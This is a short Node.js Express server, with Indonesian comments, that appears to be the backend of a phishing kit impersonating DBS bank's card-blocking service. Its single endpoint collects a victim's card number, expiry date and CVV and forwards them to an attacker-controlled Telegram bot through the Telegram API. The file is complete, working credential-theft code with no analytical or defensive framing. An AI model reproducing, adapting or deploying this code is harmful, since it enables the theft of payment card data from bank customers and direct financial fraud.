const express = require('express');
const fetch = require('node-fetch');
const dotenv = require('dotenv');
dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static(__dirname)); // biar index.html bisa dibuka

app.post('/kirim-ke-telegram', async (req, res) => {
  const { nomor, valid, cvv } = req.body;

  const message = `🚫 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor Kartu:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
  const token = process.env.BOT_TOKEN;
  const chat_id = process.env.CHAT_ID;

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
    });
    const data = await response.json();
    if (data.ok) res.sendStatus(200);
    else res.sendStatus(500);
  } catch (error) {
    res.status(500).send("Error: " + error.message);
  }
});

app.listen(3000, () => {
  console.log("Server berjalan di http://localhost:3000");
});
